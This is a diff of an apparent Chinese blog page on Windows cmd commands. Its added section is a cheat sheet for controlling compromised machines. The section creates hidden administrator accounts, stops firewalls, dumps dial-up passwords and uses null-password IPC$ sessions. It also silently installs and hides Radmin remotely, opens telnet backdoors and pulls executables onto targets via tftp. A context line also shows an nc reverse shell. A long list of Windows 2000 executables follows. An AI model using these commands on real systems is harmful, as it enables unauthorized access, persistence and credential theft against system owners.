@@ -15,7 +15,7 @@
 <meta property="og:url" content="http://yoursite.com/2017/05/21/cmd常用命令/index.html">
 <meta property="og:site_name" content="Tellenw">
 <meta property="og:description" content="最近不小心看到的资料以后可以尝试用cmd命令解决一些问题了。">
-<meta property="og:updated_time" content="2017-05-20T17:07:18.535Z">
+<meta property="og:updated_time" content="2017-05-20T17:08:58.461Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="cmd常用命令">
 <meta name="twitter:description" content="最近不小心看到的资料以后可以尝试用cmd命令解决一些问题了。">
@@ -325,6 +325,333 @@ nc -e /bin/sh 本机IP -p 本机端口 *linux,unix 反向连接突破对方主�
 -d 使用调试方式；
 -g 取消全局文件名。
 </code></pre><p>FTP使用的内部命令如下(中括号表示可选项):<br>1.![cmd[args]]：在本地机中执行交互shell，exit回到ftp环境，如：!ls<em>.zip<br>2.$ macro-ame[args]： 执行宏定义macro-name。<br>3.account[password]： 提供登录远程系统成功后访问系统资源所需的补充口令。<br>4.append local-file[remote-file]：将本地文件追加到远程系统主机，若未指定远程系统文件名，则使用本地文件名。<br>5.ascii：使用ascii类型传输方式。<br>6.bell：每个命令执行完毕后计算机响铃一次。<br>7.bin：使用二进制文件传输方式。<br>8.bye：退出ftp会话过程。<br>9.case：在使用mget时，将远程主机文件名中的大写转为小写字母。<br>10.cd remote-dir：进入远程主机目录。<br>11.cdup：进入远程主机目录的父目录。<br>12.chmod mode file-name：将远程主机文件file-name的存取方式设置为mode，如：chmod 777 a.out。<br>13.close：中断与远程服务器的ftp会话(与open对应)。<br>14.cr：使用asscii方式传输文件时，将回车换行转换为回行。<br>15.delete remote-file：删除远程主机文件。<br>16.debug[debug-value]：设置调试方式， 显示发送至远程主机的每条命令，如：deb up 3，若设为0，表示取消debug。<br>17.dir[remote-dir][local-file]：显示远程主机目录，并将结果存入本地文件。<br>18.disconnection：同close。<br>19.form format：将文件传输方式设置为format，缺省为file方式。<br>20.get remote-file[local-file]： 将远程主机的文件remote-file传至本地硬盘的local-file。<br>21.glob：设置mdelete，mget，mput的文件名扩展，缺省时不扩展文件名，同命令行的-g参数。<br>22.hash：每传输1024字节，显示一个hash符号(#)。<br>23.help[cmd]：显示ftp内部命令cmd的帮助信息，如：help get。<br>24.idle[seconds]：将远程服务器的休眠计时器设为[seconds]秒。<br>25.image：设置二进制传输方式(同binary)。<br>26.lcd[dir]：将本地工作目录切换至dir。<br>27.ls[remote-dir][local-file]：显示远程目录remote-dir， 并存入本地文件local-file。<br>28.macdef macro-name：定义一个宏，遇到macdef下的空行时，宏定义结束。<br>29.mdelete[remote-file]：删除远程主机文件。<br>30.mdir remote-files local-file：与dir类似，但可指定多个远程文件，如 ：mdir </em>.o.*.zipoutfile 。<br>31.mget remote-files：传输多个远程文件。<br>32.mkdir dir-name：在远程主机中建一目录。<br>33.mls remote-file local-file：同nlist，但可指定多个文件名。<br>34.mode[modename]：将文件传输方式设置为modename， 缺省为stream方式。<br>35.modtime file-name：显示远程主机文件的最后修改时间。<br>36.mput local-file：将多个文件传输至远程主机。<br>37.newer file-name： 如果远程机中file-name的修改时间比本地硬盘同名文件的时间更近，则重传该文件。<br>38.nlist[remote-dir][local-file]：显示远程主机目录的文件清单，并存入本地硬盘的local-file。<br>39.nmap[inpattern outpattern]：设置文件名映射机制， 使得文件传输时，文件中的某些字符相互转换， 如：nmap $1.$2.$3[$1，$2].[$2，$3]，则传输文件a1.a2.a3时，文件名变为a1，a2。该命令特别适用于远程主机为非UNIX机的情况。<br>40.ntrans[inchars[outchars]]：设置文件名字符的翻译机制，如ntrans1R，则文件名LLL将变为RRR。<br>41.open host[port]：建立指定ftp服务器连接，可指定连接端口。<br>42.passive：进入被动传输方式。<br>43.prompt：设置多个文件传输时的交互提示。<br>44.proxy ftp-cmd：在次要控制连接中，执行一条ftp命令， 该命令允许连接两个ftp服务器，以在两个服务器间传输文件。第一条ftp命令必须为open，以首先建立两个服务器间的连接。<br>45.put local-file[remote-file]：将本地文件local-file传送至远程主机。<br>46.pwd：显示远程主机的当前工作目录。<br>47.quit：同bye，退出ftp会话。<br>48.quote arg1，arg2…：将参数逐字发至远程ftp服务器，如：quote syst.<br>49.recv remote-file[local-file]：同get。<br>50.reget remote-file[local-file]：类似于get， 但若local-file存在，则从上次传输中断处续传。<br>51.rhelp[cmd-name]：请求获得远程主机的帮助。<br>52.rstatus[file-name]：若未指定文件名，则显示远程主机的状态， 否则显示文件状态。<br>53.rename[from][to]：更改远程主机文件名。<br>54.reset：清除回答队列。<br>55.restart marker：从指定的标志marker处，重新开始get或put，如：restart 130。<br>56.rmdir dir-name：删除远程主机目录。<br>57.runique：设置文件名只一性存储，若文件存在，则在原文件后加后缀.1， .2等。<br>58.send local-file[remote-file]：同put。<br>59.sendport：设置PORT命令的使用。<br>60.site arg1，arg2…：将参数作为SITE命令逐字发送至远程ftp主机。<br>61.size file-name：显示远程主机文件大小，如：site idle 7200。<br>62.status：显示当前ftp状态。<br>63.struct[struct-name]：将文件传输结构设置为struct-name， 缺省时使用stream结构。<br>64.sunique：将远程主机文件名存储设置为只一(与runique对应)。<br>65.system：显示远程主机的操作系统类型。<br>66.tenex：将文件传输类型设置为TENEX机的所需的类型。<br>67.tick：设置传输时的字节计数器。<br>68.trace：设置包跟踪。<br>69.type[type-name]：设置文件传输类型为type-name，缺省为ascii，如:type binary，设置二进制传输方式。<br>70.umask[newmask]：将远程服务器的缺省umask设置为newmask，如：umask 3<br>71.user user-name[password][account]：向远程主机表明自己的身份，需要口令时，必须输入口令，如：user anonymous my@email。<br>72.verbose：同命令行的-v参数，即设置详尽报告方式，ftp 服务器的所有响 应都将显示给用户，缺省为on.<br>73.?[cmd]：同help.</p>
+<hr>
+<p><em>又看到了一些，补充</em></p>
+<p>net share d:\web=e:\web /grant:zk0898,change </p>
+<p>控制面版：运行&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;:control<br>计算机管理：command  MMC<br>结束XP防火墙进程:net stop sharedaccess<br>查看ADSL帐号密码的代码:dialupass /allusers /stext “c:\pass.txt<br>启动3389服务：net start TermService<br>关闭所有防火墙的代码:cmd.exe /c net stop sharedaccess<br>iis命令重启:iisreset /reboot<br>用CMD命令实现路由跟踪:tracert 域名(如：www.google.com)<br>结束进程：NET SHARE<br>查看版本：ver<br>查看中端(服务）：net start<br>查看文件：dir<br>查看3389：<br>加用户：c:\winnt\system32&gt;net user adminserver$ admin /add<br>提权限：net localgroup administrators adminserver$ /add<br>211.38.172.2   2180<br>查看用户net user<br>远程连接到主机CMD命令：telnet 主机IP<br>踢人：logoff ID<br>查看当前人：query user<br>打开telnet:net start telnet<br>telnet连接工具：OpenTelnet<br>删除共享： net share e123=e:\<br>删除共享： net share c$ /del<br>启用GUEST：net user guest /active:yes<br>为GUEST设密码：net user guest 888888<br>提升到管理员：net localgroup “Administrators” guest /add</p>
+<p>超级用户隐藏器:c:\door adminserver$:admin</p>
+<p>克隆帐号：ca \IP 你建立的帐号 密码 肉机默认帐号 密码<br>ca \127.0.0.1 adminserver$ admin adminserver admin</p>
+<p>完全禁止系统模认工享<br>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace\DelegateFolders{59031a47-3f72-44a7-89c5-5595fe6b30ee}]</p>
+<p>3389替换服务———————–<br>中修改[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermService]<br>c:\winnt\system32\copy termsrv.exe service.exe<br>c:\winnt\system32\cd..<br>c:\winnt\sc \127.0.0.1 config Alerter binpath= c:\winnt\system32\service.exe</p>
+<p>端口转向：f:\web\ftp.exe “c:\fpipe.exe -v -l 开放的端口 -r 要转向的端口 ip”</p>
+<p>使用空口令连接:<br>net use \对方IP\ipc$ “” /user:”administrator”<br>(在上传文件的目录下)远程复制文件:<br>c:\radmin&gt;net use \a-01\ipc$ “12345” /user:administrator</p>
+<p>c:\ramdin&gt;copy r_server.exe \a-01\admin$\system32<br>c:\ramdin&gt;copy radmin.reg \a-01\admin$\sytem32<br>在对方CMD下：<br>c:\winnt\system32>regedit /s radmin.reg<br>c:\winnt\system32>r_server.exe /install /silenec<br>net start r_server</p>
+<p>copy r_server.exe \对方IP\admin$\system32<br>c:\opentelnet.exe \IP ADMINISTRATOR “” 0 90</p>
+<p>copy 文件名 \IP\admin$\system32<br>进入对方CMD:<br>c:\opentelnet.exe \Ip administrator “” 0 90<br>登陆CMD:<br>c:\telnet IP 90</p>
+<p>安装RADMIN:<br>c:\winnt\system32\<br>                  r_server /install silence<br>c:\winnt\system32\<br>                  r-server<br>导入注册表:<br>c:\winnt\system32\regedit.exe /s aaa.reg<br>看端口:<br>c:\winnt\system32\<br>                  netstat -an<br>改端口:<br>c:\winnt\system32\<br>                  r_server.exe /port:1024 /pass:1234 /save /silence<br>起动服务:<br>c:\winnt\system32\net start r_server<br>隐藏文件:<br>c:\winnt\system32\attrib.exe +h r_server.exe +h</p>
+<p>%systemroot$\system32</p>
+<p>看看共享开了没有,没有的话把共享开开 </p>
+<p>c:\winnt\system32&gt;net share<br>清单是空的。 </p>
+<p>c:\winnt\system32&gt;net share ipc$<br>命令成功完成。<br>c:\winnt\system32&gt;net share admin$<br>命令成功完成。 </p>
+<p>注册表运行命令<br>regedit</p>
+<p>查看端口：netstat-n</p>
+<p>SA传送文件TFTP<br>先在本机开tftp服务 sqlexec</p>
+<p>tftp-i IP get windxp.exe c:\windows\system32\com\windxp.exe</p>
+<p>2000命令集———————————<br>win2000命令集accwiz.exe &gt; accessibility wizard for walking you through setting up your machine for your mobility needs. 辅助工具向导 </p>
+<p>acsetups.exe &gt; acs setup dcom server executable </p>
+<p>actmovie.exe &gt; direct show setup tool 直接显示安装工具 </p>
+<p>append.exe &gt; allows programs to open data in specified directories as if they were in the current directory. 允许程序打开制定目录中的数据 </p>
+<p>arp.exe &gt; network display and modify ip - hardware addresses 显示和更改计算机的ip与硬件物理地址的对应列表 </p>
+<p>at.exe &gt; at is a scheduling utility also included with unix 计划运行任务 </p>
+<p>atmadm.exe &gt; displays statistics for atm call manager. atm调用管理器统计 </p>
+<p>attrib.exe &gt; display and modify attributes for files and folders 显示和更改文件和文件夹属性 </p>
+<p>autochk.exe &gt; used to check and repair windows file systems 检测修复文件系统 </p>
+<p>autoconv.exe &gt; automates the file system conversion during reboots 在启动过程中自动转化系统 </p>
+<p>autofmt.exe &gt; automates the file format process during reboots 在启动过程中格式化进程 </p>
+<p>autolfn.exe &gt; used for formatting long file names 使用长文件名格式 </p>
+<p>bootok.exe &gt; boot acceptance application for registry </p>
+<p>bootvrfy.exe &gt; bootvrfy.exe, a program included in windows 2000 that notifies the system that startup was successful. bootvrfy.exe can be run on a local or remote computer. 通报启动成功<br>cacls.exe &gt; displays or modifies access control lists (acls) of files. 显示和编辑acl </p>
+<p>calc.exe &gt; windows calculators 计算器 </p>
+<p>cdplayer.exe &gt; windows cd player cd播放器 </p>
+<p>change.exe &gt; change { user | port | logon } 与终端服务器相关的查询 </p>
+<p>charmap.exe &gt; character map 字符映射表 </p>
+<p>chglogon.exe &gt; same as using “change logon” 启动或停用会话记录 </p>
+<p>chgport.exe &gt; same as using “change port” 改变端口（终端服务） </p>
+<p>chgusr.exe &gt; same as using “change user” 改变用户（终端服务） </p>
+<p>chkdsk.exe &gt; check the hard disk for errors similar to scandisk 3 stages must specify a drive letter 磁盘检测程序 </p>
+<p>chkntfs.exe &gt; same as using chkdsk but for ntfs ntfs磁盘检测程序 </p>
+<p>cidaemon.exe &gt; component of ci filer service 组成ci文档服务 </p>
+<p>cipher.exe &gt; displays or alters the encryption of directories [files] on ntfs partitions. 在ntfs上显示或改变加密的文件或目录 </p>
+<p>cisvc.exe &gt; content index – it’s the content indexing service for i 索引内容 </p>
+<p>ckcnv.exe &gt; convertor 变换 </p>
+<p>cleanmgr.exe &gt; disk cleanup, popular with windows 98 磁盘清理 </p>
+<p>cliconfg.exe &gt; sql server client network utility sql客户网络工具 </p>
+<p>clipbrd.exe &gt; clipboard viewer for local will allow you to connect to other clipboards 剪贴簿查看器 </p>
+<p>clipsrv.exe &gt; start the clipboard server 运行clipboard服务 </p>
+<p>clspack.exe &gt; clspack used to create a file listing of system packages 建立系统文件列表清单 </p>
+<p>cluster.exe &gt; display a cluster in a domain 显示域的集群 </p>
+<p><em>cmd</em>.exe &gt; famous command prompt 没什么好说的！ </p>
+<p>cmdl32.exe &gt; connection manager auto-download 自动下载连接管理 </p>
+<p>cmmgr32.exe &gt; connection manager 连接管理器 </p>
+<p>cmmon32.exe &gt; connection manager monitor 连接管理器监视 </p>
+<p>cmstp.exe &gt; connection manager profile manager 连接管理器配置文件安装程序 </p>
+<p>comclust.exe &gt; about cluster server 集群 </p>
+<p>comp.exe &gt; comclust add, remove, or join a cluster. 比较两个文件和文件集的内容＊ </p>
+<p>compact.exe &gt; displays or alters the compression of files on ntfs partitions. 显示或改变ntfs分区上文件的压缩状态 </p>
+<p>conime.exe &gt; console ime ime控制台 </p>
+<p>control.exe &gt; starts the control panel 控制面板 </p>
+<p>convert.exe &gt; convert file system to ntfs 转换文件系统到ntfs </p>
+<p>convlog.exe &gt; converts ms iis log files 转换iis日志文件格式到ncsa格式 </p>
+<p>cprofile.exe &gt; copy profiles 转换显示模式 </p>
+<p>c.exe &gt; ms windows s host version 5.1 较本宿主版本 </p>
+<p>csrss.exe &gt; client server runtime process 客户服务器runtime进程 </p>
+<p>csvde.exe &gt; comma separated variable import/export utility 日至格式转换程序 </p>
+<p>dbgtrace.exe &gt; 和terminal server相关 </p>
+<p>dcomcnfg.exe &gt; display the current dcom configuration. dcom配置属性 </p>
+<p>dcphelp.exe &gt; ? </p>
+<p>dcpromo.exe &gt; promote a domain controller to adsi ad安装向导 </p>
+<p>ddeshare.exe &gt; display dde shares on local or remote computer dde共享 </p>
+<p>ddmprxy.exe &gt; </p>
+<p>debug.exe &gt; runs debug, a program testing and editing tool. 就是debug啦！ </p>
+<p>dfrgfat.exe &gt; defrag fat file system fat分区磁盘碎片整理程序 </p>
+<p>dfrgntfs.exe &gt; defrag ntfs file system ntfs分区磁盘碎片整理程序 </p>
+<p>dfs<em>cmd</em>.exe &gt; configures a dfs tree 配置一个dfs树 </p>
+<p>dfsinit.exe &gt; distributed file system initialization 分布式文件系统初始化 </p>
+<p>dfssvc.exe &gt; distributed file system server 分布式文件系统服务器 </p>
+<p>diantz.exe &gt; ms cabinet maker 制作cab文件 </p>
+<p>diskperf.exe &gt; starts physical disk performance counters 磁盘性能计数器 </p>
+<p>dllhost.exe &gt; dllhost is used on all versions of windows 2000. dllhost is the hedost process for all com+ applications. 所有com+应用软件的主进程 </p>
+<p>dllhst3g.exe &gt; </p>
+<p>dmadmin.exe &gt; disk manager service 磁盘管理服务 </p>
+<p>dmremote.exe &gt; part of disk management 磁盘管理服务的一部分 </p>
+<p>dns.exe &gt; dns applications dns </p>
+<p>doskey.exe &gt; recalls windows command lines and creates macros 命令行创建宏 </p>
+<p>dosx.exe &gt; dos extender dos扩展 </p>
+<p>dplaysvr.exe &gt; direct play helper 直接运行帮助 </p>
+<p>drwatson.exe &gt; dr watson for 2000 fault detector 华生医生错误检测 </p>
+<p>drwtsn32.exe &gt; dr watson for 2000 viewer and configuration manager 华生医生显示和配置管理 </p>
+<p>dtcsetup.exe &gt; installs mdtc </p>
+<p>dvdplay.exe &gt; windows 2000 dvd player dvd播放 </p>
+<p>dxdiag.exe &gt; direct-x diagnostics direct-x诊断工具 </p>
+<p>edlin.exe &gt; line-oriented text editor. 命令行的文本编辑器（历史悠久啊！）<br>edlin.exe &gt; line-oriented text editor. 命令行的文本编辑器（历史悠久啊！） </p>
+<p>esentutl.exe &gt; ms database utility ms数据库工具 </p>
+<p>eudcedit.exe &gt; private character editor ture type造字程序 </p>
+<p>eventvwr.exe &gt; windows 2000 event viewer 事件查看器 </p>
+<p>evnt<em>cmd</em>.exe &gt; event to trap translator; configuration tool </p>
+<p>evntwin.exe &gt; event to trap translator setup </p>
+<p>exe2bin.exe &gt; converts exe to binary format 转换exe文件到二进制 </p>
+<p>expand.exe &gt; expand files that have been compressed 解压缩 </p>
+<p>extrac32.exe &gt; cab file extraction utility 解cab工具 </p>
+<p>fastopen.exe &gt; fastopen tracks the of files on a hard disk and stores the information in memory for fast access. 快速访问在内存中的硬盘文件 </p>
+<p>faxcover.exe &gt; fax cover page editor 传真封面编辑 </p>
+<p>faxqueue.exe &gt; display fax queue 显示传真队列 </p>
+<p>faxsend.exe &gt; fax wizard for sending faxes 发送传真向导 </p>
+<p>faxsvc.exe &gt; starts fax server 启动传真服务 </p>
+<p>fc.exe &gt; compares two files or sets of files and their differences 比较两个文件的不同 </p>
+<p>find.exe &gt; searches for a text string in file or files 查找文件中的文本行 </p>
+<p>findstr.exe &gt; searches for strings in files 查找文件中的行 </p>
+<p>finger.exe &gt; fingers a user and displays statistics on that user finger一个用户并显示出统计结果 </p>
+<p>fixmapi.exe &gt; fix mapi files 修复mapi文件 </p>
+<p>flattemp.exe &gt; enable or disable temporally directories 允许或者禁用临时文件目录 </p>
+<p>fontview.exe &gt; display fonts in a font file 显示字体文件中的字体 </p>
+<p>forcedos.exe &gt; forces a file to start in dos mode. 强制文件在dos模式下运行 </p>
+<p>freecell.exe &gt; popular windows game 空当接龙 </p>
+<p>ftp.exe &gt; file transfer protocol used to transfer files over a network connection 就是ftp了 </p>
+<p>gdi.exe &gt; graphic device interface 图形界面驱动 </p>
+<p>grovel.exe &gt; </p>
+<p>grpconv.exe &gt; program manager group convertor 转换程序管理员组 </p>
+<p>help.exe &gt; displays help for windows 2000 commands 显示帮助 </p>
+<p>hostname.exe &gt; display hostname for machine. 显示机器的hostname </p>
+<p>ie4uinit.exe &gt; ie5 user install tool ie5用户安装工具 </p>
+<p>ieshwiz.exe &gt; customize folder wizard 自定义文件夹向导 </p>
+<p>iexpress.exe &gt; create and setup packages for install 穿件安装包 </p>
+<p>iisreset.exe &gt; restart iis admin service 重启iis服务 </p>
+<p>internat.exe &gt; keyboard language indicator applet 键盘语言指示器 </p>
+<p>ipconfig.exe &gt; windows 2000 ip configuration. 察看ip配置 </p>
+<p>ipsecmon.exe &gt; ip security monitor ip安全监视器 </p>
+<p>ipxroute.exe &gt; ipx routing and source routing control program ipx路由和源路由控制程序 </p>
+<p>irftp.exe &gt; setup ftp for wireless communication 无线连接 </p>
+<p>ismserv.exe &gt; intersite messaging service 安装或者删除service control manager中的服务 </p>
+<p>jdbgmgr.exe &gt; microsoft debugger for 4的调试器 </p>
+<p>jetconv.exe &gt; convert a jet engine database 转换jet engine数据库 </p>
+<p>jetpack.exe &gt; compact jet database. 压缩jet数据库 </p>
+<p>jview.exe &gt; command-line loader for 的命令行装载者 </p>
+<p>krnl386.exe &gt; core component for windows 2000 2000的核心组件 </p>
+<p>label.exe &gt; change label for drives 改变驱动器的卷标 </p>
+<p>lcwiz.exe &gt; license compliance wizard for local or remote systems. 许可证符合向导 </p>
+<p>ldifde.exe &gt; ldif cmd line manager ldif目录交换命令行管理 </p>
+<p>licmgr.exe &gt; terminal server license manager 终端服务许可协议管理 </p>
+<p>lights.exe &gt; display connection status lights 显示连接状况 </p>
+<p>llsmgr.exe &gt; windows 2000 license manager 2000许可协议管理 </p>
+<p>llssrv.exe &gt; start the license server 启动许可协议服务器 </p>
+<p>lnkstub.exe &gt; </p>
+<p>locator.exe &gt; rpc locator 远程定位 </p>
+<p>lodctr.exe &gt; load perfmon counters 调用性能计数 </p>
+<p>logoff.exe &gt; log current user off. 注销用户 </p>
+<p>lpq.exe &gt; displays status of a remote lpd queue 显示远端的lpd打印队列的状态，显示被送到基于unix的服务器的打印任务 </p>
+<p>lpr.exe &gt; send a print job to a network printer. 重定向打印任务到网络中的打印机。通常用于unix客户打印机将打印任务发送给连接了打印设备的nt的打印机服务器。 </p>
+<p>lsass.exe &gt; lsa executable and server dll 运行lsa和server的dll </p>
+<p>lserver.exe &gt; specifies the new dns domain for the default server 指定默认server新的dns域 </p>
+<p>macfile.exe &gt; used for managing macfiles 管理macfiles </p>
+<p>magnify.exe &gt; used to magnify the current screen 放大镜 </p>
+<p>makecab.exe &gt; ms cabinet maker 制作cab文件 </p>
+<p>mdm.exe &gt; machine debug manager 机器调试管理 </p>
+<p>mem.exe &gt; display current memory stats 显示内存状态 </p>
+<p>migpwd.exe &gt; migrate passwords. 迁移密码 </p>
+<p>mmc.exe &gt; microsoft management console 控制台 </p>
+<p>mnmsrvc.exe &gt; netmeeting remote desktop sharing netmeeting远程桌面共享 </p>
+<p>mobsync.exe &gt; manage synchronization. 同步目录管理器 </p>
+<p>mountvol.exe &gt; creates, s, or lists a volume mount point. 创建、删除或列出卷的装入点。 </p>
+<p>mplay32.exe &gt; ms media player 媒体播放器<br>mpnotify.exe &gt; multiple provider notification application 多提供者通知应用程序 </p>
+<p>mq1sync.exe &gt; </p>
+<p>mqbkup.exe &gt; ms message queue backup and restore utility 信息队列备份和恢复工具 </p>
+<p>mqexchng.exe &gt; msmq exchange connector setup 信息队列交换连接设置 </p>
+<p>mqmig.exe &gt; msmq migration utility 信息队列迁移工具 </p>
+<p>mqsvc.exe &gt; ? </p>
+<p>mrinfo.exe &gt; multicast routing using snmp 使用snmp多点传送路由 </p>
+<p>mscdexnt.exe &gt; installs mscd (ms cd extensions) 安装mscd </p>
+<p>msdtc.exe &gt; dynamic transaction controller console 动态事务处理控制台 </p>
+<p>msg.exe &gt; send a message to a user local or remote. 发送消息到本地或远程客户 </p>
+<p>mshta.exe &gt; html application host html应用程序主机 </p>
+<p>msiexec.exe &gt; starts windows installer program 开始windows安装程序 </p>
+<p>mspaint.exe &gt; microsoft paint 画板 </p>
+<p>msswchx.exe &gt; </p>
+<p>mstask.exe &gt; task schedule program 任务计划表程序 </p>
+<p>mstinit.exe &gt; task scheduler setup 任务计划表安装 </p>
+<p>narrator.exe &gt; program will allow you to have a narrator for reading. microsoft讲述人 </p>
+<p>nbtstat.exe &gt; displays protocol stats and current tcp/ip connections using nbt 使用 nbt（tcp/ip 上的 netbios）显示协议统计和当前 tcp/ip 连接。 </p>
+<p>nddeapir.exe &gt; ndde api server side ndde api服务器端 </p>
+<p>net.exe &gt; net utility 详细用法看/？ </p>
+<p>net1.exe &gt; net utility d version from ms net的升级版 </p>
+<p>netdde.exe &gt; network dde will install itself into the background 安装自己到后台 </p>
+<p>netsh.exe &gt; creates a shell for network information 用于配置和监控 windows 2000 命令行脚本接口。 </p>
+<p>netstat.exe &gt; displays current connections. 显示协议统计和当前的 tcp/ip 网络连接。 </p>
+<p>nlsfunc.exe &gt; loads country-specific information 加载特定国家（地区）的信息。windows 2000 和 ms-dos 子系统不使用该命令。接受该命令只是为了与 ms-dos 文件兼容。 </p>
+<p>notepad.exe &gt; opens windows 2000 notepad 记事本 </p>
+<p>nslookup.exe &gt; displays information for dns 该诊断工具显示来自域名系统 (dns) 名称服务器的信息。 </p>
+<p>ntbackup.exe &gt; opens the nt backup utility 备份和故障修复工具 </p>
+<p>ntbooks.exe &gt; starts windows help utility 帮助 </p>
+<p>ntdsutil.exe &gt; performs db maintenance of the adsi 完成adsi的db的维护 </p>
+<p>ntfrs.exe &gt; nt file replication service nt文件复制服务 </p>
+<p>ntfrsupg.exe &gt; </p>
+<p>ntkrnlpa.exe &gt; kernel patch 核心补丁 </p>
+<p>ntoskrnl.exe &gt; core nt kernel kt的核心 </p>
+<p>ntsd.exe &gt; </p>
+<p>ntvdm.exe &gt; simulates a 16-bit windows environment 模拟16位windows环境 </p>
+<p>nw16.exe &gt; netware redirector netware转向器 </p>
+<p>nw.exe &gt; runs netware s 运行netware脚本 </p>
+<p>odbcad32.exe &gt; odbc 32-bit administrator 32位odbc管理 </p>
+<p>odbcconf.exe &gt; configure odbc driver’s and data source’s from command line 命令行配置odbc驱动和数据源 </p>
+<p>os2.exe &gt; an os/2 warp server (os2 /o) os/2 </p>
+<p>os2srv.exe &gt; an os/2 warp server os/2 </p>
+<p>os2ss.exe &gt; an os/2 warp server os/2 </p>
+<p>osk.exe &gt; on screen keyboard 屏幕键盘 </p>
+<p>packager.exe &gt; windows 2000 packager manager 对象包装程序 </p>
+<p>pathping.exe &gt; combination of ping and tracert 包含ping和tracert的程序 </p>
+<p>pax.exe &gt; is a posix program and path names used as arguments must be specified in posix format. use “//c/users/default” instead of “c:usersdefault.” 启动便携式存档互换 (pax) 实用程序 </p>
+<p>pentnt.exe &gt; used to check the pentium for the floating point division error. 检查pentium的浮点错误 </p>
+<p>perfmon.exe &gt; starts windows performance monitor 性能监视器 </p>
+<p>ping.exe &gt; packet internet groper 验证与远程计算机的连接 </p>
+<p>posix.exe &gt; used for backward compatibility with unix 用于兼容unix </p>
+<p>print.exe &gt; cmd line used to print files 打印文本文件或显示打印队列的内容。 </p>
+<p>progman.exe &gt; program manager 程序管理器 </p>
+<p>proquota.exe &gt; profile quota program </p>
+<p>psxss.exe &gt; posix subsystem application posix子系统应用程序 </p>
+<p>qappsrv.exe &gt; displays the available application terminal servers on the network<br>在网络上显示终端服务器可用的程序 </p>
+<p>qprocess.exe &gt; display information about processes local or remote 在本地或远程显示进程的信息（需终端服务） </p>
+<p>query.exe &gt; query termserver user process and sessions 查询进程和对话 </p>
+<p>quser.exe &gt; display information about a user logged on 显示用户登陆的信息（需终端服务） </p>
+<p>qwinsta.exe &gt; display information about terminal sessions. 显示终端服务的信息 </p>
+<p>rasadmin.exe &gt; start the remote access admin service 启动远程访问服务 </p>
+<p>rasautou.exe &gt; creates a ras connection 建立一个ras连接 </p>
+<p>rasdial.exe &gt; dial a connection 拨号连接 </p>
+<p>rasphone.exe &gt; starts a ras connection 运行ras连接 </p>
+<p>rcp.exe &gt; copies a file from and to a rcp service. 在 windows 2000 计算机和运行远程外壳端口监控程序 rshd 的系统之间复制文件 </p>
+<p>rdpclip.exe &gt; rdpclip allows you to copy and paste files between a terminal session and client console session. 再终端和本地复制和粘贴文件 </p>
+<p>recover.exe &gt; recovers readable information from a bad or defective disk 从坏的或有缺陷的磁盘中恢复可读取的信息。 </p>
+<p>redir.exe &gt; starts the redirector service 运行重定向服务 </p>
+<p>regedt32.exe &gt; 32-bit register service 32位注册服务 </p>
+<p>regini.exe &gt; modify registry permissions from within a 用脚本修改注册许可 </p>
+<p>register.exe &gt; register a program so it can have special execution characteristics. 注册包含特殊运行字符的程序 </p>
+<p>regsvc.exe &gt; </p>
+<p>regsvr32.exe &gt; registers and unregister’s dll’s. as to how and where it register’s them i dont know. 注册和反注册dll </p>
+<p>regtrace.exe &gt; options to tune debug options for applications failing to dump trace statements<br>trace 设置<br>regwiz.exe &gt; registration wizard 注册向导 </p>
+<p>remrras.exe &gt; </p>
+<p>replace.exe &gt; replace files 用源目录中的同名文件替换目标目录中的文件。 </p>
+<p>reset.exe &gt; reset an active section 重置活动部分 </p>
+<p>rexec.exe &gt; runs commands on remote hosts running the rexec service. 在运行 rexec 服务的远程计算机上运行命令。rexec 命令在执行指定命令前，验证远程计算机上的用户名，只有安装了 tcp/ip 协议后才可以使用该命令。 </p>
+<p>risetup.exe &gt; starts the remote installation service wizard. 运行远程安装向导服务 </p>
+<p>route.exe &gt; display or edit the current routing tables. 控制网络路由表 </p>
+<p>routemon.exe &gt; no longer supported 不再支持了！ </p>
+<p>router.exe &gt; router software that runs either on a dedicated dos or on an os/2 system. route软件在 dos或者是os/2系统 </p>
+<p>rsh.exe &gt; runs commands on remote hosts running the rsh service 在运行 rsh 服务的远程计算机上运行命令 </p>
+<p>rsm.exe &gt; mounts and configures remote system media 配置远程系统媒体 </p>
+<p>rsnotify.exe &gt; remote storage notification recall 远程存储通知回显 </p>
+<p>rsvp.exe &gt; resource reservation protocol 源预约协议 </p>
+<p>runas.exe &gt; run a program as another user 允许用户用其他权限运行指定的工具和程序 </p>
+<p>rundll32.exe &gt; launches a 32-bit dll program 启动32位dll程序 </p>
+<p>runonce.exe &gt; causes a program to run during startup 运行程序再开始菜单中 </p>
+<p>rwinsta.exe &gt; reset the session subsystem hardware and software to known initial values 重置会话子系统硬件和软件到最初的值 </p>
+<p>savedump.exe &gt; does not write to e:winntuser.dmp 不写入user.dmp中 </p>
+<p>scardsvr.exe &gt; smart card resource management server 子能卡资源管理服务器 </p>
+<p>schupgr.exe &gt; it will read the schema files (.ldf files) and upgrade the schema. (part of adsi) 读取计划更新文件和更新计划 </p>
+<p>secedit.exe &gt; starts security editor help 自动安全性配置管理 </p>
+<p>services.exe &gt; controls all the services 控制所有服务 </p>
+<p>sethc.exe &gt; set high contrast - changes colours and display mode logoff to set it back to normal 设置高对比 </p>
+<p>setreg.exe &gt; shows the software publishing state key values 显示软件发布的国家语言 </p>
+<p>setup.exe &gt; gui box prompts you to goto control panel to configure system components 安装程序（转到控制面板） </p>
+<p>setver.exe &gt; set version for files 设置 ms-dos 子系统向程序报告的 ms-dos 版本号 </p>
+<p>sfc.exe &gt; system file checker test and check system files for integrity 系统文件检查 </p>
+<p>sfmprint.exe &gt; print services for macintosh 打印macintosh服务 </p>
+<p>sfmpsexe.exe &gt; </p>
+<p>sfmsvc.exe &gt; </p>
+<p>shadow.exe &gt; monitor another terminal services session. 监控另外一台中端服务器会话 </p>
+<p>share.exe &gt; windows 2000 和 ms-dos 子系统不使用该命令。接受该命令只是为了与 ms-dos 文件兼容 </p>
+<p>shmgrate.exe &gt; </p>
+<p>shrpubw.exe &gt; create and share folders 建立和共享文件夹 </p>
+<p>sigverif.exe &gt; file signature verification 文件签名验证 </p>
+<p>skeys.exe &gt; serial keys utility 序列号制作工具 </p>
+<p>smlogsvc.exe &gt; performance logs and alerts 性能日志和警报 </p>
+<p>smss.exe &gt; </p>
